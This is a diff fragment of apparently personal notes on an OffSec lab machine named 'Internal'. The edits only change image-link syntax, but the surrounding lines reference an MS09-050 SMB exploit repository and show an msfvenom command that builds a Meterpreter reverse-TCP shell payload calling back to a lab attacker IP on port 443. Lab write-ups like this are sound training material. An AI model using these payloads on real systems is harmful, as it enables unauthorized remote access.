@@ -124,7 +124,7 @@ Nmap done: 1 IP address (1 host up) scanned in 4.86 seconds
 ```
 
 ## HTTP 5357
-![](Pasted%20image%2020260510090425.png)
+![[Pasted image 20260510090425.png]]
 
 ## RPC 135
 ```zsh
@@ -206,7 +206,7 @@ Copied to: /home/kali/CTF/OffSec/Internal/42080-[turkish]-mobile-penetration-tes
 ```
 ## github
 https://github.com/sec13b/ms09-050_CVE-2009-3103/tree/main
-![](Pasted%20image%2020260510090916.png)
+![[Pasted image 20260510090916.png]]
 ```zsh
 ┌──(kali㉿kali)-[~/CTF/OffSec/Internal]
 └─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.218 LPORT=443  EXITFUNC=thread -f python -v shell
